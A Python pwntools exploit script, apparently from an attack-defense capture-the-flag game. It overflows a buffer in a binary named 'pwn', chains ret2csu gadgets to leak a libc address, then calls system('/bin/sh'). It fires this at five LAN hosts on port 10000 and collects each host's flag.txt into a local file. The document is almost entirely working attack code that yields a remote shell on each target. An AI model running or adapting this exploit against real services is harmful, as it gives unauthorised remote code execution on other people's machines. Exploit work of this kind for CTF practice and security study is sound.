from pwn import *
import os
#context.log_level = 'debug'
#context.terminal = ['gnome-terminal','-x','sh','-c']
level5 = ELF('./pwn')
#sh = process('./pwn')
ip = ['192.168.3.29','192.168.3.30','192.168.3.31','192.168.3.27','192.168.3.25']
libc = ELF('libc-2.23.so')
write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()
csu_front_addr = 0x400690
csu_end_addr = 0x4006AA
fakeebp = 'b' * 8
pop_rdi = 0x4006b3
one = 0x4f322
def csu(rbx, rbp, r12, r13, r14, r15, last):
    payload = 'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    payload += p64(last)
    return payload
    # sh.send(payload)
    # sleep(1)
def exp(ip):
    sh = remote(ip,10000,timeout=5)
    sh.recvuntil('Input:\n')
    sh.send(csu(0, 1, write_got, 8, write_got, 1, main_addr))
    write_addr = u64(sh.recv(8))
    # execve(bss_base+8)
    # log.info(hex(write_addr))
    libc_base = write_addr - libc.symbols['write']
    # log.info(hex(libc_base))
    execve_addr = libc_base + libc.symbols['system']
    bin_sh = libc_base + 0x18ce17
    # log.success('execve_addr ' + hex(execve_addr))
    sh.recvuntil('Input:\n')

    payload = 'A'*0x88+p64(pop_rdi)+p64(bin_sh)+p64(execve_addr)+p64(main_addr)
    sh.sendline(payload)
    sh.sendline('cat flag.txt')
    flag = sh.recvuntil('}')[5:-1]
    with open('flag.txt', 'a+')as f:
        f.write(flag+'\n')
    print flag
#exp(ports[0])
if os.path.exists('flag.txt'):
    os.remove('flag.txt')
for i in range(5):
    try:
        exp(ip[i])
    except Exception as e:
        print "error!"
        continue
